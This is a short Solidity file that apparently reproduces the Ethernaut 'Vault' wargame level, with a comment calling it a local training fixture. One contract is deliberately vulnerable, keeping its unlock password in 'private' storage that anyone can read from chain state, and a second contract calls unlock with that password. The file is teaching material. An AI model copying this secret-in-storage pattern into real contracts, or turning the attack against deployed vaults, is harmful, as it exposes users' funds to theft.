// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

contract EthernautVault {
    bool public locked;
    bytes32 private password;

    constructor(bytes32 initialPassword) {
        locked = true;
        password = initialPassword;
    }

    function unlock(bytes32 candidate) external {
        if (candidate == password) locked = false;
    }
}

contract VaultAttack {
    function attack(EthernautVault target, bytes32 password) external {
        target.unlock(password);
    }
}

// Local training fixture: private storage is readable from the EVM state.

// end

